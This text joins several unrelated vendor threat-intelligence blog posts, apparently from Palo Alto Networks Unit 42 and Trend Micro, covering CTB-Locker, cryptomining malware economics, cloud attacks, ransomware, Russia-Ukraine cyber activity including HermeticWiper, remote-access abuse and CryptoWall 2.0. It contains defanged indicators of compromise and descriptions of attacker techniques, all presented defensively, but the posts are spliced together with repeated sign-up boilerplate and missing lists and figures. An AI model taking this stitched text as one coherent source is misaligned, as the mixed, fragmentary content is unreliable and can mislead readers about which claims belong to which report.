text
"This post is also available in: 日本語 (Japanese) CTB-Locker is a well-known ransomware Trojan used by crimeware groups to encrypt files on the victim's endpoints and demand ransom payment to decrypt the files back to their original state, but most antiviruses detect it by mistake as CryptoLocker (only one vendor correctly detects it as CTB-Locker)."
The attack vector is very basic and repeats itself: It begins with a spear phishing email sent with SCR attachments (double zipped).
Once executed by the user the first stage malware downloads and executes the ransomware from a fixed hardcoded server list.
The first known campaign was launched by Crimeware on November 2014.
The first stage downloaded the ransomware from these sites:
"A very serious campaign was launched between January 19, 2015 and January 20, 2015, and Palo Alto Networks Enterprise Security Platform has discovered more than 1000 unique attacks since."
"The attacker used a polymorphic malware builder to generate malware with a unique hash for each victim, preventing signature-based solutions from detecting the new attacks before it was too late for the victim."
"This tactic is a nightmare for legacy security products that are based on legacy techniques such as bytes signatures, since they can only detect attacks after the damage is done instead of preventing it as a true solution should."
Palo Alto Networks Enterprise Security Platform offers multilayer protection to prevent this attack along with other attacks without the need for prior knowledge of the specific attack.
We can see here that server hostnames were changed but they didn’t change the server IP address – see the attached file with results for files from last week’s campaign from VirusTotal.
Most legacy security programs could not detect this malware at the time it was posted.
"If you re-test these hashes again from last week you can see an average of 49/57 engines that detect last week’s threat – but that’s too little, too late for anyone who already lost data."
"This campaign started earlier today, and the malware uses the same techniques and even the same IOCs: And only added two new hostnames:"
By now you shouldn’t be surprised that one of them is on the same known malicious IP address.
"We found 147 new unique pieces of malware today alone, two of them fully undetectable by the legacy security solutions in VirusTotal and most of them barely detected by one vendor (few have 4/57 detection rate)."
See below:
So basically you have two choices:
The most surprising fact about this campaign is that almost all the IOCs haven’t been changed: For those still using legacy solutions we’ve attached two lists of SHA256 hashes in a text file format for reference.
"One list shows the new campaign, which continues to progress."
"The other list is of last week’s campaign by the same attackers (exhaustive or close to it). Palo Alto Networks Enterprise Security Platform would have stopped this ransomware attack campaign thanks to the platform’s unique integration between the network, endpoint and the cloud to maximize security."
"Attacks aren't getting any less sophisticated, so it is time to leave legacy security solutions behind and upgrade to real, prevention-based security."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) Over the past six months, we’ve seen a major increase in the number of attack campaigns with the ultimate goal of mining cryptocurrency."
It’s a subject Unit 42 has been tracking in the past year:
"So, what is driving a widespread shift from attackers and creating a significant trend in the industry?"
There are three factors at work:
"To answer the question in more detail, it’s important to put yourself into the criminal’s shoes and consider what alternative routes they have to monetize infections."
"In this brief, we’ll share how this trend came to fruition, why it’s so prevalent, and how security professionals and defenders can keep an eye out for this rising type of threat."
How Attacks Monetize Infections
"While targeted attacks gain the most attention from researchers and media, the majority of malware infections are untargeted and even indiscriminate."
"Instead of seeking out specific targets, many criminals aim to infect as many systems as possible and then turn those infections into cash."
"This has been true for over a decade, although the mechanisms available to criminals have shifted in that time."
"To understand where we are now, it helps to look at how we got here, and to look at the evolution of common cybercriminal activities."
"Back in the early 2000s, some of the earliest “botnet herders” made their income by relaying spam emails through infected computers."
"Over time, that business became less profitable due to anti-spam controls and ISPs preventing infected systems from directly relaying emails."
"In the mid-2000s, criminals made great profits from using Banking Trojans to steal credentials for online banking websites, and subsequently draining the accounts’ associated funds."
"This account takeover activity continues today, but various anti-fraud measures and law enforcement actions have made it less profitable and riskier for criminals."
"Another aspect of Banking Trojan infections is that, while the criminal may be infecting hosts indiscriminately, the value of the host greatly depends on the individual who owns it, and the criminals’ ability to “cash out” their bank account."
"Figure 1 is a capture from a book I wrote with some colleagues in 2008, “Cyber Fraud: Tactics, Techniques, and Procedures.”"
It shows the price that a criminal enterprise called IFRAME DOLLARS was charging to infect computers in various countries at that time.
"Figure 1: Capture from Cyber Fraud: Tactics, Techniques, and Procedures showing prices of host infections by country."
"In 2007, the infection of a system in Australia went for US$0.60, while an infection in Poland was only a fraction of the cost, at US$0.096."
The difference in price represented the difference in value: criminals were able to make more money through a Banking Trojan account takeover from an Australian infection than they could in Poland.
"As anti-fraud protections evolved, so did the criminals."
Fast forward five years to 2013 and the rise of the Ransomware business model
This new way to generate profit had two major advantages over account takeovers:
"Put another way, the ransomware model represented both increased efficiency and decreased risk in monetizing the infection."
"Anyone who’s been paying attention to cybercrime since 2013 is aware of the ransomware surge, infecting systems throughout the world and plaguing networks’ administrators."
"While only a tiny fraction (possibly 1 in 1000) of systems infected with a banking Trojan pay out for attackers, a much higher portion of ransomware victims pay to get their files back."
"While US$300 payments are less than a single account takeover could return, ransomware makes greater returns due to the volume and decreased risk in this new business model."
Cybercriminals have become good business people: they saw the benefits and embraced the change.
Enter “The Bubble” – Where We Are Now
"In the last two years, but particularly in the last six months, the price of bitcoin and other cryptocurrencies experienced a massive price surge with respect to the U.S. dollar and other fiat currencies."
"Here’s the chart for bitcoin over the last two years, showing a rise of 2,000% to 4,000% in the versus the U.S. dollar."
"Figure 2: Price of bitcoin in U.S. dollars from CoinMarketCap While botnets mining cryptocurrency is nothing new, the technique was much less profitable than using ransomware."
"In fact, with the rise of specialized bitcoin mining hardware, no regular PC can make any significant amount of money for an attacker."
"However, there are many other “crypto coins” in the market today."
The one we see mined most by attackers is called Monero.
"In contrast to bitcoin, Monero was designed to enable private transactions using a closed ledger, and its mining algorithm is still mined effectively by both PC CPUs and GPUs."
"As the chart below shows, Monero has risen even faster than bitcoin in price in the last two years, with more than a 30,000% gain in U.S. dollars."
Figure 3: Price of Monero in U.S. dollars from CoinMarketCap
A normal PC used to mine Monero can earn around US$0.25 per day at the current prices.
"That number is small, but it’s important to note that it doesn’t matter what country or network a Monero miner is part of: computers in Australia and Poland mine at the same speed."
"Every infected system is a profit-generating resource when mining Monero, and users are much less likely to identify their infection and remove the mining program than they would be with ransomware."
"For context, in January, we found a Monero mining campaign that infected around 15 million systems, largely in the developing world."
"If these systems remained infected for at least 24 hours each, the attackers could have earned well over 3 million U.S. dollars in Monero."
"Additionally, the risk of arrest and conviction is significantly lower than with ransomware, as mining cryptocurrency is less likely to generate reports to law enforcement than a data-destroying ransomware infection."
What’s Next?
This wave of attacks will continue as long as it maintains a high level of profitability with a low level of risk for cybercriminals.
"For defenders, it’s important to note that the techniques used to infect systems with coin mining malware are the same as they were for ransomware."
"Infections typically begin with emails carrying malicious macro documents, drive-by exploit kits targeting browsers, or direct attacks on servers running vulnerable software."
"There is no single solution to stopping these attacks, but the same technologies and policies you use to prevent other malware infections will be effective."
"Across the changing landscape of botnet herders, Banking Trojans, ransomware and coin mining is one constant: the business-savvy drive to maximize profit and reduce risk."
"Using these as our guide, we can make sense of where we are today, how we got here, and be prepared for what has yet to develop in the future."
Here are three things to watch for:
1. A marked increase in the price of Monero or other cryptocurrencies will draw even more attackers into this business.
"For many users, this could actually be a positive development, as the negative impact of having resources sapped from one’s computer is much less than paying a ransom or restoring your system from a backup due to ransomware."
"Conversely, a crash in the price of cryptocurrencies will decrease the profitability and drive criminals back to ransomware."
2. Listen to your fans or keep an eye on your CPU usage.
Many users realize their system is infected with coin mining malware when their laptop fans kick into high-speed mode to keep the overtaxed CPU cool.
"Listening to fans won’t work at the enterprise scale, but implementing widespread CPU performance monitoring could be a good way to find compromised devices."
"This will also help you identify the coin mining “insider threat,” as misguided administrators may see their organizations’ unused CPU time as a way to generate personal income."
3. Criminals will find ways to target these attacks.
"Compromising a user’s browser or a regular home PC will net the criminal an average system for mining coins, but higher-end systems will generate more income."
Attackers will soon begin targeting devices with higher specifications to get more bang for their buck.
Gaming PCs with high-end GPUs and servers with large numbers of processing cores will be prime targets.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
It’s that time of year again – our researchers have analyzed and reviewed the threats and attacks that occurred during the first half of 2021.
"Our report, Attacks From All Angles: 2021 Midyear Security Roundup, highlights many of the active attacks we saw, from APTs to ransomware to zero-day exploits."
I’d like to highlight an area where we are seeing increased activity: attacks against cloud infrastructures.
"I’ve spoken on this at a few events and asked my audiences how many have active cloud infrastructure projects going on, the answer is always most of them."
"In our 1H’ 2021 Cyber Risk Index, we asked organizations what their top infrastructure risks are."
Cloud security has been in the top two for the last few years.
"Obviously, many organizations are moving quickly to the cloud and, as such, need to be thinking about how to secure it."
Below is an overview of what we’re seeing in cloud attacks.
Threats Impacting Cloud Environments
"In our first half report, we highlight an APT group named TeamTNT that has been targeting clouds for quite a while now."
"They have focused most of their efforts on planting crypto-mining malware on cloud servers in an effort to mine Monero coins, but we have also seen them utilize DDoS IRC bots, steal cloud account credentials, and exfil data."
"As you can see from the above diagram, all of these are end goals for most attacks."
"Speaking of data exfil, in the first half we saw APT actors utilize cloud-based file storage to exfiltrate their stolen data."
"For example, we found that Conti operators use the cloud storage synchronization tool Rclone to upload files to the Mega cloud storage service."
"Similarly, DarkSide operators used Mega client for exfiltrating files to cloud storage, 7-Zip for archiving, and PuTTY application for network file transfers."
"This use of known, legitimate tools is not new; we call that “living off the land” and have seen this tactic pick up recently, including usage by ransomware actors."
Many organizations now need to look at ways of monitoring legitimate tools usage within their networks to identify any malicious uses.
Cloud Security Architecture
"When developing your cloud security architecture and strategy, it is important to always keep the ends in mind."
"In this case, what are the motivation and end goals of an attacker?"
"As you see in the image above, most cloud attacks are going to fall into one of these areas."
"Depending on what you are doing as part of your cloud infrastructure, you should be able to identify if any or all of these end goals could be targeted in your environment."
"From there, you can work backwards to develop your strategy for protecting those initial access areas tied to the different attacks."
"A challenge many organizations face is that the cloud isn’t simple, and many of the technologies that make up the cloud are new, with new features being deployed all the time."
Understanding how these work and – more importantly – how to secure them can be very difficult.
"Utilizing a security platform approach can help build your cloud to be more secure, but educating your architects and administrators will also help."
"One key area is hardening your cloud account credentials, as these will be regularly targeted by malicious actors."
Using multi-factor authentication to access all accounts can minimize this risk tremendously.
"Take a look at Trend Micro Cloud One, part of our complete cybersecurity platform, to learn more."
The cloud is only one aspect of our full 1H 2021 report.
"To get more details on all the different threats and attacks we observed, download and read the full report here."
"Tags Cloud | Cyber Crime | Expert Perspective | Cyber Threats | APT & Targeted Attacks | Network | Articles, News, Reports"
Cybercriminals have embraced the anonymous nature of cryptocurrency as a new preferred method of profit.
Unit 42 released details about attackers hijacking web browsers to mine for compute resources and exchange for cryptocurrency.
"With the increasing value of cryptocurrency, such as bitcoin and Ethereum, and a better business model with higher returns than malware- and exploit-type attacks, it’s no surprise these types of attacks are becoming more commonplace."
Cybercriminals will compromise a website and abuse a legitimate tool on that site to gain access to the compute resources of site visitors’ systems.
"Using this access, attackers will essentially steal compute resources and exchange them for cryptocurrency credit."
This all occurs without the users’ consent or knowledge throughout the duration of their site visits.
"The malicious activity itself doesn’t cause long-term damage to systems, and ends as soon as users leave the malicious or compromised site."
"Additionally, the site will still provide users with its normal, intended functionality."
"However, users likely experience a noticeable slowdown in system performance."
"If you believe your system is being affected by this type of attack, leaving the site or closing your browser will, in most cases, end the attack."
"Additionally, you should practice good cybersecurity hygiene."
"This means avoiding unfamiliar websites, clicking on links or downloading attachments from unknown email senders, keeping products updated with the latest security patches, enabling multi-factor authentication, and using reputable security products."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese)
"In our updated report on ransomware from Unit 42, “Ransomware: Unlocking the Lucrative Criminal Business Model,” Unit 42 researcher Bryan Lee notes: “In 2016, it was thought that there were less than one hundred active ransomware variants out in the wild."
"Today, the number of total ransomware variants at least over 150, if not hundreds more.” It’s reasonable to ask why ransomware continues not only to exist but to thrive."
"The first answer to this, as we’ve outlined in our report, is that ransomware is a lucrative cybercriminal business model."
"However, in addition to the human factor, there are technical reasons."
"Specifically, there are three things that combine to make ransomware a particularly potent threat on the technical level:"
"In some ways, these three points state the obvious."
But the full ramifications and why these make ransomware hard to stop aren’t always discussed.
"The way ransomware works is well documented, but let’s recap here."
Ransomware is downloaded to a user’s system and executed on it.
"The way the attackers get the ransomware on the system varies: it can be through unpatched vulnerabilities, social engineering or both."
The most common way ransomware operators levy attacks is through email or by web browsing to malicious or compromised sites.
The overwhelming majority of ransomware attacks are against Microsoft Windows systems.
"Once malware is running on the user’s system, it seeks out and encrypts files and folders that hold information critical for the user, such as documents, business applications or even database files."
"In some cases, the ransomware is sophisticated enough to target specific application files."
"Most importantly, because the ransomware is executing with the compromised user’s privileges, any file the legitimate, now-compromised user has access to, including network shares and backups, is fair game for the ransomware."
It’s this last point that gets to the heart of why ransomware is so potent.
"From an operating system point of view, the ransomware IS the user."
"Even though Microsoft Windows today features a robust user access control system, that system has inherent limitations."
"In the early days of Window Vista, Microsoft enabled aggressive security checking to ensure user-initiated actions were legitimate."
"This was well-intentioned but ultimately backfired: users got fed up clicking “Are you sure?” dialog boxes and quickly disabled the feature, or just mindlessly clicked “OK” every time they saw it."
Microsoft made reasonable adjustments so that these alerts are now raised sparingly.
"Although that feature was never enabled to protect user data files like ransomware targets, there is a clear lesson from the experience: too many security checks on user activity fails in the end."
"Bringing that lesson to bear here, the only way the operating system could protect against ransomware would be to raise “Are you sure?” dialog boxes on everyday operations against the kinds of files that ransomware targets."
And this is where the second point comes to bear.
"Unlike other forms of malware, ransomware is very specific in its targeting."
It goes after the files users are most likely to care about.
These also happen to be files users are most likely to use on a day-to-day basis or that are critical to an organization’s operations.
Extra layers of protection for those files would be incredibly onerous.
Imagine having to click through “Are you sure?” dialog boxes for every document or picture you opened in a day.
"From an engineering point of view, this sole, specific targeting of files that matter significantly increases the chances of ransomware’s success."
This brings us to the third point: there is little attack time wasted on files that don’t matter to the victim.
Even a successful ransomware attack that is halted early by security software will achieve some level of damage – enough to make the victim consider paying the ransom to get the files back.
"If user32.dll were encrypted and unusable, it would be a problem."
"But when your organization’s overall accounting and audit report is inaccessible right before the big deadline, that’s catastrophic."
The net of these three points is that ransomware is a threat such that focus needs to be placed solely around prevention.
"There is no effective solution for ransomware at the operating system level, as outlined above."
"And unlike other attacks, ransomware attacks can’t succeed “just a little.”"
"In some cases, a single file lost is more than enough to count as a fully successful attack."
"In some ways, ransomware is a threat unlike any other."
Its impact and scope are both broad and deep in ways that are unique.
"Because of that, from a risk assessment point of view, ransomware needs to be put in a class by itself – a class that acknowledges that the risks from a successful attack of any kind are very high."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese)
"Over the past several weeks, Russia-Ukraine cyber activity has escalated substantially."
"Beginning on Feb. 15, a series of distributed denial of service (DDoS) attacks commenced."
"These attacks have continued over the past week, impacting both the Ukrainian government and banking institutions."
"On Feb. 23, a new variant of wiper malware named HermeticWiper was discovered in Ukraine."
"Shortly after, a new round of website defacement attacks were also observed impacting Ukrainian government organizations."
"Consistent with our previous reporting on the topic, several western governments have issued recommendations for their populations to prepare for cyberattacks that could disrupt, disable or destroy critical infrastructure."
"We have already observed an increase in Russian cyber activity, which we reported on in our initial Threat Brief published last month and our recent report on the Gamaredon group."
Future attacks may target U.S. and Western European organizations in retaliation for increased sanctions or other political measures against the Russian government.
We recommend that all organizations proactively prepare to defend against this potential threat.
"This post was substantially updated on Feb. 24 to add information on the recent DDoS attacks, HermeticWiper malware and website defacement; update our recommendations for how organizations should prepare for potential cyber impact; and provide additional details for our customers and clients on how we can help."
"This post was substantially updated March 31 to add information on phishing and scam attacks, cybersquatting trends, fake donation websites, DoS attacks on Ukrainian news sites and distribution of malicious binaries."
"Full visualization of the techniques observed, relevant courses of action and indicators of compromise (IoCs) related to this report can be found in the Unit 42 ATOM viewer. We will continue to provide updates with new information and recommendations as they become available."
"DDoS Attacks Impacting Ukrainian Government and Banking Institutions HermeticWiper Malware Website Defacement Rise in Phishing and Scam Attacks Increase in Cybersquatting Trends Fake Donation Websites DoS Attacks on Ukrainian News Sites Distribution of Apps How Palo Alto Networks Is Working to Keep You Safe How You Should Prepare for an Increase in Cyberthreats Such as Wipers, DDoS, Website Defacement and Other Related Attacks How Unit 42 Threat Intelligence and Security Consulting Can Help Additional Cybersecurity Resources Indicators of Compromise"
Appendix A: Cortex Xpanse: Identifying Assets That May Be Impacted by CISA’s Known Exploited Vulnerabilities
"On Feb. 15, the Cyberpolice of Ukraine reported that residents were actively receiving fake SMS text messages."
"These messages were likely intended to cause alarm among the population, as they claimed that ATMs were malfunctioning."
"Shortly after the text messages were observed, several DDoS attacks occurred."
"These attacks impacted Ukrainian government organizations including the Ministry of Defense, Ministry of Foreign Affairs, Armed Forces of Ukraine and the publicly funded broadcaster Ukrainian Radio."
"Additionally, the attacks targeted two banking institutions, PrivatBank and Oschadbank."
An initial investigation into the DDoS attacks suggested that Mirai and Meris bot networks may have been leveraged in the attacks.
"On Feb. 18, both the United States and the United Kingdom attributed these DDoS attacks to Russia’s Main Intelligence Directorate (GRU). Over the past week, Ukraine has continued to observe a relatively constant flow of DDoS attacks targeting its government and financial institutions."
"However, at this time, attribution for the ongoing attacks has not been established."
The Ukrainian CERT did identify a post on RaidForums from a user named “Carzita” that suggested that additional actors may also be launching DDoS and defacement attacks for undisclosed reasons.
"On Feb. 23, a malicious file named conhosts._exe (SHA256: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591) was uploaded to a public malware repository from an organization in Kyiv, Ukraine."
This executable is a signed file with a valid signature from an organization named Hermetica Digital Ltd. This signing certificate has since been explicitly revoked by its issuer.
"Upon execution, this file enumerates all files on a hard drive, wipes the partition info and then forces a system reboot, which predictably results in the following screen:"
Further analysis has confirmed that the malware accepts command-line arguments allowing an attacker to instruct the malware to sleep for a period of time or to shut down the system.
Additionally the kernel module responsible for the actual wiping activity is from a legitimate application called EaseUS Partition Master.
This software is designed as free partition software that can reorganize disk space for better performance.
"In tracking this threat, early reports show that the malware has been deployed against a financial institution in Ukraine as well as two contractors in Latvia and Lithuania that provide services to the Ukrainian Government."
"Additionally, ESET researchers have warned that they found this malware installed across “hundreds of machines” in Ukraine."
"Concurrent with the discovery of wiper malware, we also witnessed a second round of website defacements on Feb. 23."
"These attacks appear to have copied the messaging template observed in attacks exploiting the OctoberCMS vulnerability a month earlier on Jan.14, while adding a .onion web address and a message in red font that translates to, “Do you need proof, see the link at the end.”"
The .onion site links to an entity calling themselves “Free Civilian” and offering to sell databases containing the personal data of Ukrainian citizens.
"Over the past 24 hours, the list of entities on the leaks section has expanded to 48 gov.ua domains and one Ukranian company (motorsich[.]com) that builds engines for airplanes and helicopters."
Our team analyzed the larger trends regarding Ukraine-related phishing and scam URLs detected by Advanced URL Filtering.
"We noticed an overall increase in the detection of websites that host phishing and scam URLs on domains using Ukraine-related TLDs such as gov.ua and com.ua, or containing popular Ukraine-related keywords such as ""ukraine"" and ""ukrainian""."
"This trend correlates with an increase in Google searches for terms like ""Ukraine aid."""
"From January to late February, it appears that the number of Ukraine-related phishing and scam sites largely followed a similar trend as Ukraine-related internet searches; however, the number of phishing and scam sites has continued to rise through mid-late March as the situation remains ongoing."
Figure 8 shows that the number of Ukraine-related phishing/scam sites is currently continuing to rise about a month after the “Ukraine aid” search term started trending in Google search.
"Among these phishing and scam URLs, we found a targeted phishing attack."
"On March 16 while ingesting a third-party data feed, our in-house machine learning models detected a phishing webpage targeting a Ukrainian state administration employee."
The webpage is imitating a popular cloud file storage site.
"Upon visiting the webpage, the “Username” field is pre-"
"populated with the targeted employee’s email address, and the user is then prompted to enter in their password in order to view a sensitive document as shown in Figure 9."
Figure 9. hxxps://startrackzm[.]com/wap-admin/ONE-DRIVE/one%20d%20%20no%20auto.php?Email=REDACTED@REDACTED.gov.ua.
"A phishing webpage targeting a Ukrainian state administration employee, detected by our in-house machine learning models on March 16.Our teams at Palo Alto Networks are actively monitoring the phishing landscape surrounding Ukraine-related URLs and are sharing this threat intelligence with relevant authorities in Ukraine and internationally."
We are also sharing a list of IoCs that were detected as phishing and scam URLs.
Palo Alto Networks customers who subscribe to Advanced URL Filtering are already protected from these IoCs.
"We monitored a list of 50 legitimate Ukraine-related domains (e.g., popular news and donation websites) and keywords (e.g., Ukraine, refugee) as targets for cybersquatting."
"We detected 11,637 cybersquatting newly registered domains (NRDs) during February and March."
"In particular, we noticed a sharp increase in the number of cybersquatting domains that were registered close to Feb. 24, as shown in Figure 10 below."
We manually analyzed a sample set of these cybersquatting domains.
Below we share some interesting case studies.
A detailed analysis of these domains revealed that many of them are fake.
These donation websites provide little to no information about the associated organization and distribution of funds.
"Many of these websites use cryptocurrency wallets (e.g., BTC, ETH) to accept payment (likely because these wallets are easy to set up and require no verification). We also find that some websites are mimicking popular donation websites or organizations to trick users into paying them money."
We show some examples in Figure 11.
"For instance, donatetoukraine[.]com is pretending to be associated with the popular Come Back Alive campaign."
"While the banking information shared on the donation website matches the original campaign website, we confirmed that the BTC wallet address is different from the actual."
We found a cybersquatting domain – save-russia[.]today – that is launching DoS attacks on Ukrainian news sites.
"Once a user opens the website in the browser, it starts making requests to various Ukrainian news sites and lists the number of requests made to each new site on the home page, as shown in Figure 12 below."
Figure 12.
A cybersquatting domain save-russia[.]today is launching DoS attacks on Ukrainian news sites.
We strongly recommend that users be alert to the possibility of cybersquatting domains.
"In particular, fake donation websites mimicking popular websites can be misleading, as described earlier."
"Before donating money, we recommend checking whether the website is referenced and shared by the official charity or government organization."
Our teams at Palo Alto Networks will continue monitoring domain squatting attacks and work to protect customers against them.
We detected campaigns of fake downloads where threat actors have set up web pages to host malicious binaries.
Most of these web pages show malicious binaries as popular browsers or communication apps in order to deceive users.
"For example, we detected a website that was distributing a malicious binary by masquerading as a popular global communication app targeting users in Ukraine."
"Note that Palo Alto Networks customers receive protections against such domains from the Next-Generation Firewall via Advanced URL Filtering, DNS Security and WildFire URL Analysis subscriptions."
We also found that these fake download campaigns rotate domains to distribute the same malicious binaries.
"For example, we detected two domains distributing the same malicious binary where one domain was impersonating a popular, widely used video conferencing application and the other a widely used internet browser."
Our teams at Palo Alto Networks will continue to monitor and work to protect our customers against such attacks.
"Consistent with our previous reporting on the situation, Unit 42 continues to lead a company-wide effort to collect, evaluate and disseminate the latest intelligence on cyber activity related to Russia and Ukraine."
We are actively collaborating with our partners in industry and governments to share our analysis and findings based on our global threat telemetry network.
These efforts have enabled us to make near-daily updates to our platform to ensure our customers have the best protection possible.
"This includes blocking hundreds of domain names, IP addresses and URLs for our customers related to newly discovered attacks."
We’ve updated and added signatures to the WildFire analysis and Cortex XDR Prevent and Pro products to block newly discovered vulnerabilities and malware including HermeticWiper.
Read more about Cortex XDR protections.
"Our Threat Prevention and Web Application and API Security products added coverage for the OctoberCMS vulnerability exploited in the WhisperGate attacks, and we released an XSOAR Playbook to help organizations hunt for this threat."
Cortex Xpanse can assist with understanding and managing your organization’s attack surface as well as identifying vulnerable resources.
We have released public reports on the WhisperGate attacks and the infrastructure and tactics used by the Gamaredon group.
"On the Unit 42 website, you will also find a free ATOM which contains a structured mapping of the Gamaredon group’s tactics aligned to MITRE’s ATT&CK framework."
"As the situation continues to develop, we’ll continue to update our blog with the latest information."
There is no single action you can take to protect your organization against this threat.
"Unlike a new malware family or vulnerability in the wild, the attacks we expect could come in many forms."
Several western governments have proposed broad recommendations focused on technical hygiene.
We consider these appropriate given the variety of tactics that Russian actors have used in the past.
"We recommend organizations prioritize actions in the following four areas: There is no way to know for certain what shape an attack may take, but taking these steps will help provide broad protection against what we expect to come."
"Unit 42, the threat intelligence and security consulting arm of Palo Alto Networks, has a team of experts who can help your organization assess and test your security controls with proactive assessments and incident simulation services."
"Because of the likelihood of ransomware attacks – or destructive attacks that pose as ransomware – it may be beneficial to focus on preparing in this area, particularly ensuring backup and recovery plans are in place."
"We have distilled the knowledge we’ve gained from responding to hundreds of ransomware incidents into our Ransomware Readiness Assessment offering, which is designed to help organizations strengthen their processes and technology to mitigate threats like the ones we expect in the coming days and weeks."
"If you think you may have been compromised by wiper attacks, Gamaredon, DDoS attacks or other cyber activity related to Russia-Ukraine, or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200."
Threat Brief: Ongoing Russia and Ukraine Cyber Conflict (Jan. 20) Russia’s Gamaredon aka Primitive Bear APT Group Actively Targeting Ukraine (Updated Feb. 16)
"Spear Phishing Attacks Target Organizations in Ukraine, Payloads Include the Document Stealer OutSteel and the Downloader SaintBot Threat Briefing: Protecting Against Russia-Ukraine Cyber Activity Palo Alto Networks Resource Page: Protect Against Russia-Ukraine Cyber Activity Cortex XDR Protections Against Malware Associated with Ukraine and Russia Cyber Activity"
CISA: Shields Up Technical Guidance 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da a64c3e0522fad787b95bfb6a30c3aed1b5786e69e88e023c062ec7e5cebf4d3e 3c557727953a8f6b4788984464fb77741b821991acbf5e746aebdd02615b1767 2c10b2ec0b995b88c27d141d6f7b14d6b8177c52818687e4ff8e6ecf53adf5bf 06086c1da4590dcc7f1e10a6be3431e1166286a9e7761f2de9de79d7fda9c397 Name
Hermetica Digital Ltd Thumbprint 1AE7556DFACD47D9EFBE79BE974661A5A6D6D923 Serial Number 0C 48 73 28 73 AC 8C CE BA F8 F0 E1 E8 32 9C EC
gcbejm2rcjftouqbxuhimj5oroouqcuxb2my4raxqa7efkz5bd5464id[.]onion
Please see the IoCs on GitHub.
"In Alert AA22-011A (updated March 1, 2022), the U.S. Department of Homeland Security’s Cybersecurity and Infrastructure Security Agency (DHS/CISA) identifies a selection of vulnerabilities that Russian advanced persistent threat (APT) groups are assessed to have exploited in the past, but recommends that users take action against a much broader list of known exploited vulnerabilities (KEVs)."
"The cited KEVs and their impacted devices – all of which can be identified using Cortex Xpanse – are: Cortex Xpanse’s ability to index the entire internet helps organizations discover, prioritize, and remediate significant exposures on their attack surfaces – including all of the impacted services listed above."
"We routinely observe vulnerable devices across the global internet, despite the fact that most of these CVEs are more than two years old."
"Beyond Alert AA22-011A, CISA’s overarching guidance for attack surface reduction includes hardening of forward-facing network services, with prioritized patching of KEVs, as documented in Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities (KEV)."
This directive requires agencies to remediate all vulnerabilities that CISA includes in their KEV catalog based on an assessment that the vulnerabilities “carry significant risk to the federal enterprise.”
"Learn more and see a detailed workflow example on the Palo Alto Networks SecOps blog, “How Xpanse Can Identify CISA-Identified Known Exploited Vulnerabilities.”"
"Updated April 1, 2022, at 11 a.m. PT."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Recent events continue to highlight the abuse of remote access applications in the enterprise.
"Last Tuesday, Trusteer reported that a new variant of Citadel, which has long relied on VNC to give attackers remote control over systems, began adding new credentials to systems it infects and enabling the standard Windows remote desktop application (RDP)."
This allows the attacker to maintain control over the system even after the Citadel infection is removed.
"As the report indicates, using RDP this way also allows the attackers to “fly under the radar” as RDP is commonly used by administrators and often not treated as a threat."
"Later that same week, US-CERT released alert TA14-212A on the Backoff Point of Sale (PoS) malware, which describes how malicious actors used publicly available tools to identify organizations that use remote access applications in an unsafe way."
"This reconnaissance was then leveraged in brute force attacks against credentials, toward unauthorized access, implant installation, and subsequent exfiltration of consumer payment data."
"As with any tool, remote access applications can be used for good or malicious intent."
"It would be inefficient for an administrator to travel to a physical office to make a change on a system, but its critical that organizations take control over these applications."
The first step is identifying them in your network.
Palo Alto Networks currently tracks 90 different remote-access applications in Applipedia.
"Examples include Remote Desktop Protocol (RDP), Virtual Network Connection (VNC), TeamViewer, and even Secure Shell (SSH), to name a few."
"Once you can identify the traffic, you need to separate the good from the bad."
"If your company runs Windows and relies on RDP, you can close off VNC, TeamViewer and the other 87 applications because you don’t need them."
"If your administrators and help desk are the only ones who need RDP access to your systems, disable RDP for the rest of your users."
The key is putting a policy in place and making sure your technology is enforcing that policy at the network layer.
The Backoff and Citadel reports from last week highlight how uncontrolled remote access broadens your attack surface and acts as a backdoor for attackers already in your network.
Remote-access abuse is not a new problem.
"We’ve been highlighting the importance of controlling this threat since 2009, but five years later it remains an issue for many organizations."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"The latest development in the ransomware world is CryptoWall 2.0, a new version of this malware family that uses the Tor network for command and control."
"F-Secure was the first to spot this new version on October 1, but since then the attacks have ramped up and new variants of the malware are emerging daily."
"Our WildFire analysis platform has picked up 84 CryptoWall 2.0 variants since September 30, delivered primarily through e-mail attachments but also through malicious PDFs and web exploit kits."
CryptoWall 2.0 is similar to other ransomware attacks that have plagued users and businesses for nearly a decade.
"Once it is running on a system, CryptoWall 2.0 seeks out document files and encrypts them using the RSA encryption algorithm."
"The attacker holds the key necessary to decrypt the files unless the victim agrees to pay a $500 ransom. Unlike previous versions of CryptoWall, 2.0 communicates with its command and control (C2) server through the Tor anonymization network."
"This allows attackers to hide their communications and avoid having their C2 servers shut down, but also makes it easy for organizations to block the threat."
"CryptoWall isn’t the only threat that communicates over Tor and if your network doesn’t have an explicit reason to allow anonymization networks, you should consider blocking the application altogether with your firewall."
"If your system has already been infected with CryptoWall 2.0, you’ll see a pop-up just like this one shortly after the malware has encrypted your documents."
Note that the attacker has given you a few options for how to pay them the ransom.
The green box contains four links that will work only for your system.
